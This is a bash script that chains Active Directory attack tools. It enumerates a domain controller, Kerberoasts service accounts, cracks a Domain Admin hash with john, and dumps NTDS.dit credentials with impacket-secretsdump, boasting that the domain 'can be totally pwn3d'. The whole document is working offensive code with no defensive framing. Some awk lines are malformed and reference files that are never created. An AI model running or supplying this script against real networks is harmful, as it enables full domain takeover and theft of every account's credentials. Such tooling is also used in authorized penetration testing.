start=`date +%s`

read -p "Enter Domain Controller IP: " DC_IP
read -p "Enter Domain Name (FQDN): " DOMAIN
read -s -p "Enter Username for GetUserSPNs: " USERNAME
read -s -p "Enter Password for GetUserSPNs: " PASSWORD
echo

nmap -p 389 -T4 -A -v -v -v -v -Pn --open --script ldap-rootdse,ldap-search $DC_IP
crackmapexec smb $DC_IP -u " -p" --users > cmeusers.txt
cat cmeusers.txt | awk '{ FS = " " } ; { print $5 }' > cme_usernames.txt
cat cme_usernames.txt | awk '{ FS = "\" } ; { print $2 }'
cat cme_usernames.txt | awk '{ FS = "\\" } ; { print $2 }' > cme_targetusers.txt
awk '{ F= " " } ; { print $6 }' smb_valid_users.txt > smb_valid_usernames.txt
cat smb_valid_usernames.txt | grep + | awk '{ FS = " " } ; { print $6 }' | awk '{ FS = "\\" } ; { print $2 }'
impacket-GetUserSPNs -dc-ip $DC_IP $DOMAIN/$USERNAME:$PASSWORD
impacket-GetUserSPNs $DOMAIN/$USERNAME:$PASSWORD -dc-ip $DC_IP -outputfile domain_tgs_hashes.txt
sleep 3
echo "dumping domain admins...."
sleep 5
crackmapexec smb $DC_IP -u $USERNAME -p $PASSWORD --groups "Domain Admins" > domain_admins.txt
cat domain_admins.txt | grep "Domain Admins member:" | awk '{print $4}' | cut -d'\' -f2 > da_users.txt
KRB_USER=""
for user in $(cat da_users.txt); do
  hash_line=$(grep "\$${user}\$" domain_tgs_hashes.txt | head -1)
  if [ ! -z "$hash_line" ]; then
    KRB_USER=$user
    echo "$hash_line" > ${KRB_USER}.hash
    break
  fi
done
if [ -z "$KRB_USER" ]; then
  echo "No Domain Admin with SPN found!"
  exit 1
fi
sleep 1
clear
echo "Exporting 'Domain Admin: $KRB_USER ' hash to file..."
sleep 3
clear
echo "Kerberoast in progress!"
echo "CRACKING HASHES.... PLEASE WAIT..."
john --wordlist=cme_usernames.txt --rule=dive ${KRB_USER}.hash
sleep 25
echo "...."
# Extract the cracked password for $KRB_USER
CRACKED_PASS=$(john --show ${KRB_USER}.hash 2>/dev/null | grep $KRB_USER | cut -d: -f2)
echo "Status: user \"$KRB_USER\" Cracked with password: $CRACKED_PASS!"
echo "##########Pwn3d##############"
echo "Dumping NTDS.dit via DCSYNC!"
impacket-secretsdump -dc-ip $DC_IP -use-vss -target-ip $DC_IP $DOMAIN/$KRB_USER:$CRACKED_PASS@$DC_IP
echo "Domain Dumped via VSS"
echo "...."
sleep 1
clear
end=`date +%s`
echo "Domain can be totally pwn3d in:" `expr $end - $start` seconds.
echo "Script Complete"
